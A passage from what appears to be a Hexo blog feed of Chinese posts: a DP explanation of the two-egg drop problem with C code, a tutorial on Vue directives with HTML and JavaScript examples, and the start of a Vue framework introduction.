<li>它基于PHP+ MySQL 数据库 ，只需要仅仅七张数据表，以及不足500KB的代码文件，就可以构建博客框架，写文章十分方便，支持原生Markdown语法，只要有网络就可以进行发布文章，修改文章，删除文章等操作。</li>
<li>需要额外的服务器，域名（当然了，也可以用服务器的ip来访问）等</li>
<li>模板插件比较少</li>
</ul>
</li>
</ul>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>目前重心主要放在Typecho上面，等哪一天没钱续费服务器，再转回Hexo，反正目前两边都同一时间更新，不用担心数据不同步的问题，但是可能评论迁移比较困难。</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
  </entry>
  <entry>
    <title>双蛋问题</title>
    <url>/2020/03/22/%E5%8F%8C%E8%9B%8B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>昨天看了李永乐老师的<a href="https://www.bilibili.com/video/av96214853" target="_blank" rel="noopener">视频</a>，想着利用编程实现，想着想着就动起手来了。</p>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>你有两个鸡蛋，楼层有一百层，这座楼有一个<strong>临界点</strong>，即从高于（含该楼层）高楼层往下扔鸡蛋，鸡蛋会碎，低于</p>
<p>该楼层，无论扔几次都不会碎（~~忽略物理因素），问你最少需要尝试几次，<strong>一定</strong>可以确定该临界楼层。<a id="more"></a></p>
<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>一层一层地尝试，最好的情况下只需仍一次，最坏的情况是100次，即答案是在[1,100]，即最终答案是100次。</p>
<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>二分法，即第一个鸡蛋我不从第一层开始，我从第50（100的一半）层开始，要是鸡蛋碎了，临界楼层就在[1,50]之间，接着用解法一的方式去尝试；要是不碎，说明临界楼层就在[51,100]之间，继续从75层开始，然后又会出现两种情况，重复上述过程。即第一个鸡蛋是用于确定区间，第二个鸡蛋是用于确定临界楼层。在这种情况下最坏情况下需要<strong>1+49=50</strong>次，最好的情况是<strong>8</strong>次（依次扔的楼层是50，75，87，93，96，98，99，100），即答案是在[8,50],最终答案是50.</p>
<h2 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h2><p>经过上面的尝试，我们发现，最坏情况下和最好情况下，需要的次数跨度太大了，我们可以不可以尝试着一种方案，使得最坏和最好的情况下使用次数相差最小呢？如何做到相差最小呢？那我只要两个鸡蛋所需扔的次数之和趋向于一个常数，就可以了。假设第一个鸡蛋第一次在第n层扔，假如鸡蛋碎了，第二个鸡蛋最坏情况需要扔n-1次，总次数是（1+n-1）次；假如没碎，第一个鸡蛋就可以再选择一个楼层来确定区间，那选哪一层呢？答案是第[n+(n-1)]层，假如碎了，第二个鸡蛋就从第n层开始往上寻找答案，最坏情况需要仍n-2次，即总次数是[2+(n-2)]次；假如没碎，第一个鸡蛋接着从第[n+(n-1)+(n-2)]层开始扔，重复上述过程，最坏情况下是：第一个鸡蛋扔的楼层是n，n-1，n-2，n-3，……，1，只需要[n+(n-1)+(n-2)+……+1]&gt;=100，将求得的n向下求整即可，此时n=14。即最终答案是14，即<strong>14次尝试，一定可以确定该临界值。</strong></p>
<h2 id="普遍化"><a href="#普遍化" class="headerlink" title="普遍化"></a>普遍化</h2><p>假如楼层数是m，鸡蛋数是n呢，对于某一个组合（m，n），怎样快速地得到答案呢？我们可以先画出一张表</p>
<table>
<thead>
<tr>
<th>下面是楼层数m，右边是鸡蛋数n</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><span color="##ff0000">1</span></td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>3</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>5</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>6</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>对于最左边和最上边，我们很容易可以填好，对于其他情况呢？设T（m，n）表示拥有n个蛋，需要确定m层楼的临界层的最小尝试次数。假设手上的第一个鸡蛋在第k层楼扔</p>
<ul>
<li>假如碎了，相当于鸡蛋少了，临界楼层在第k层下面，需要的次数就是{T（k-1，n-1）+1}</li>
<li>假如不碎，相当于手上的鸡蛋数没变，而且需要确定的楼层数也减少了，答案就是{T（m-k，n）+1}</li>
</ul>
<p>对于这两种情况，要么是使得鸡蛋数减少了，要么使得楼层数减少了，二者的取值有可能不一样，为了确保一定能确定出来，我们取最大值，我们记为T<sub>k</sub> 。那k的取值又该如何选择呢？我们不难发现，k可以从<strong>1</strong>取到<strong>m</strong>，都会对应一个T<sub>k</sub> ，我们只要选出最小的值即可。有同学可能会疑问，上面是选择最大值，这里为什么选择最小值呢？是因为这里的k是我们自己选择的，但是选好了k后，鸡蛋碎不碎我们无法预测，因此上面选择最大值，这里选择最小值。因此状态转移方程就是</p>
<p>T（m，n）= min(T<sub>k</sub>  ,k=1,2,3,……,m，T<sub>k</sub>={max[T（m，n-1）,T（m-k，n）]+1}</p>
<p>因此填表的方式就是以列为主序，从上往下，下面给出代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-03-22 15:44:41</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-03-22 15:56:36</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a, b) a &gt; b ? a : b</span></span><br><span class="line"><span class="keyword">int</span> T[<span class="number">100</span>][<span class="number">100</span>], egg, <span class="built_in">floor</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m, n, k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;<span class="built_in">floor</span>, &amp;egg);</span><br><span class="line">    <span class="comment">//两个循环用于初始化</span></span><br><span class="line">    <span class="keyword">for</span> (m = <span class="number">1</span>; m &lt;= <span class="built_in">floor</span>; m++) &#123;</span><br><span class="line">        T[m][<span class="number">1</span>] = m;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">1</span>; n &lt;= egg; n++) &#123;</span><br><span class="line">        T[<span class="number">1</span>][n] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 填表开始</span></span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">2</span>; n &lt;= egg; n++)</span><br><span class="line">        <span class="keyword">for</span> (m = <span class="number">2</span>; m &lt;= <span class="built_in">floor</span>; m++) &#123;</span><br><span class="line">            <span class="keyword">int</span> minTk = <span class="number">32767</span>, Tk;</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= m; k++) &#123;</span><br><span class="line">                <span class="comment">// 蛋碎了，则还需尝试k-1次，不碎还需m-k次</span></span><br><span class="line">                Tk = <span class="built_in">max</span>(T[k - <span class="number">1</span>][n - <span class="number">1</span>], T[m - k][n]);</span><br><span class="line">                Tk++;</span><br><span class="line">                minTk = minTk &lt; Tk ? minTk : Tk;</span><br><span class="line">            &#125;</span><br><span class="line">            T[m][n] = minTk;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue指令</title>
    <url>/2020/03/21/Vue%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="v-text"><a href="#v-text" class="headerlink" title="v-text"></a>v-text</h2><p>设置标签的文本值（textContent）</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        message: <span class="string">"hello"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<a id="more"></a>

  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-text</span>=<span class="string">"message"</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>  我们会发现，使用v-text设置文本的话，标签内部的文本值会被完全地覆盖</p>
<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200316/wFn0pr9f1dW3.png" alt></p>
<h2 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h2><p>设置标签地innerHTML</p>
<p>  <strong>注意</strong>当v-html的值是普通的字符串的时候，v-html和v-text的用法没有区别，但当v-html的值是一个标签的语法时，这二者的用法就有了区别</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-html</span> = <span class="string">"content1"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-text</span> = <span class="string">"content1"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-html</span> = <span class="string">"content2"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-text</span> = <span class="string">"content2"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        content1: <span class="string">"hello"</span>,</span><br><span class="line">        content2: <span class="string">"&lt;a href='https://yalexin.gitee.io/'&gt;超链接&lt;/a&gt;"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200322/SPaHMAOyWjC7.png" alt="图片"></p>
<p>  可以发现，v-html成功地渲染成了标签，但是前提是v-html所在节点能够拥有子节点。</p>
<h2 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h2><p> 为元素绑定事件</p>
<p>  我们可以从官方的<a href="https://developer.mozilla.org/zh-CN/docs/Web/Events" target="_blank" rel="noopener">文档</a>中可以得知，Vue支持的事件非常多，用法都是类似下面的情况</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 格式是   v-on:+事件名+="需要绑定的方法" --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">v-on:click</span>=<span class="string">"demo1_fun"</span> <span class="attr">value</span>=<span class="string">"事件绑定-全写"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 格式是   @+事件名+="需要绑定的方法" --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> @<span class="attr">click</span>=<span class="string">"demo2_fun"</span> <span class="attr">value</span>=<span class="string">"事件绑定-简写"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var app &#x3D; new Vue(&#123;</span><br><span class="line">    el: &quot;#app&quot;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        demo1_fun:function()&#123;</span><br><span class="line">            alert(&quot;demo1_fun&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">        demo2_fun:function()&#123;</span><br><span class="line">            alert(&quot;demo2_fun&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">        demo3_fun:function()&#123;</span><br><span class="line">            alert(&quot;demo3_fun&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  假如需要传递参数，只需要v-on处提供实参即可</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">@click="demo2_fun(p1,p2,p3,...)"</span><br></pre></td></tr></table></figure>

<p>  该指令还可以配合事件修饰符来使用，一个简单的例子就是，我们希望按下回车键时触发事件：</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> @<span class="attr">keydown.enter</span>=<span class="string">"do_sh"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>  关于更多的用法，可以参照官方<a href="[https://cn.vuejs.org/v2/guide/events.html#%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6](https://cn.vuejs.org/v2/guide/events.html#事件修饰符)">文档</a></p>
<p>  事件名不需要写<strong>on</strong>，绑定的方法定义在<strong>methods</strong>属性中，而且方法内部通过<strong>this</strong>关键字可以访问定义在<strong>data</strong>中的数据。</p>
<h2 id="v-show："><a href="#v-show：" class="headerlink" title="v-show："></a>v-show：</h2><p>根据真假切换元素的显示状态，原理是修改元素的display，实现显示和隐藏，指令的值最终被解析为布尔值(true显示，false隐藏)。</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"change_show"</span>&gt;</span>click-me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-show</span>=<span class="string">"isShow"</span>&gt;</span>这是一段测试的文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        isShow: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        change_show: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.isShow = !<span class="keyword">this</span>.isShow;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<h2 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h2><p>根据真假切换元素的显示状态，原理是操纵dom元素来切换显示状态，效果跟v-show是一样的。</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"change_show"</span>&gt;</span>click-me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">"isIf"</span>&gt;</span>这是一段测试的文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        isIf: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        change_show: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.isIf = !<span class="keyword">this</span>.isIf;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200322/BRp7PP313Lue.png" alt="图片"></p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200322/3zny7F5J6mgD.png" alt="图片"></p>
<pre><code>即当v-if的值是true时，该元素在存在于div标签中，否则将元素移除，那我们如何进行选择？ 一般来说， v-if 有    更高的切换开销，而 v-show 有更高的初始渲染开销。因此，如果需要非常频繁地切换，则使用 v-show 较好；    如果在运行时条件不太可能改变，则使用 v-if 较好。 </code></pre><h2 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h2><p>为元素绑定属性值</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">"img_src"</span> <span class="attr">v-bind:title</span>=<span class="string">"title1"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 简写 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">"img_src"</span> <span class="attr">:title</span>=<span class="string">"title2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        isShow: <span class="literal">false</span>,</span><br><span class="line">        img_src:<span class="string">"../study/images/2.jpg"</span>,</span><br><span class="line">        title1:<span class="string">"图片一"</span>,</span><br><span class="line">        title2:<span class="string">"图片二"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h2 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h2><p>根据数据源生成列表结构，语法是(item,index) in 数据源：</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"item in demo_array"</span>&gt;</span></span><br><span class="line">            每天做的事情:&#123;&#123;item&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        demo_array:[<span class="string">"写bug"</span>,<span class="string">"查bug"</span>,<span class="string">"改bug"</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200323/KILg1Tt8tV9r.png" alt="图片"></p>
<p>  v-for不仅仅可以放进<code>li</code>标签中，还可以放进其他中，而且数据源也不仅限于普通数组，对象性数组也是可以的，如：</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">"item in students"</span>&gt;</span></span><br><span class="line">            学生姓名：&#123;&#123;item.name&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            el: <span class="string">"#app"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line">                students: [</span><br><span class="line"><span class="actionscript">                    &#123; name: <span class="string">"张三"</span> &#125;,</span></span><br><span class="line"><span class="actionscript">                    &#123; name: <span class="string">"李四"</span> &#125;,</span></span><br><span class="line"><span class="actionscript">                    &#123; name: <span class="string">"王五"</span> &#125;,</span></span><br><span class="line">                ],</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h2><p>便捷地设置和获取表单元素的值，它可以将某个特定的值和表单元素的值相关联，这种关联是双向的：</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"message"</span> @<span class="attr">keydown.enter</span>=<span class="string">"setNewMsg"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        message: <span class="string">""</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        setNewMsg:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.message = <span class="string">"通过vue改变message"</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="number">66</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Vue初级</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue框架</title>
    <url>/2020/03/21/Vue%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> Vue 是一套用于构建用户界面的<strong>渐进式框架</strong> ，利用Vue可以方面地经行中小型项目的快速构建， 它的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。 这里是它的官网<a href="https://cn.vuejs.org/" target="_blank" rel="noopener">链接</a></p>
<a id="more"></a>

<h2 id="最简单的例子"><a href="#最简单的例子" class="headerlink" title="最简单的例子"></a>最简单的例子</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        &#123;&#123; message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 导包 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            el: <span class="string">"#app"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line"><span class="actionscript">                message: <span class="string">"hello world"</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>一定要导包，可以下载到本地使用，也可以直接通过远程导入的方法导入，对于制作项目，推荐下载到本地，如果只是学习，直接远程导入即可，但是前提是要有网络</strong></p>
<h2 id="el挂载点"><a href="#el挂载点" class="headerlink" title="el挂载点"></a>el挂载点</h2><ul>
<li><p>作用域：el指定的标签范围，即在这个范围之下</p>
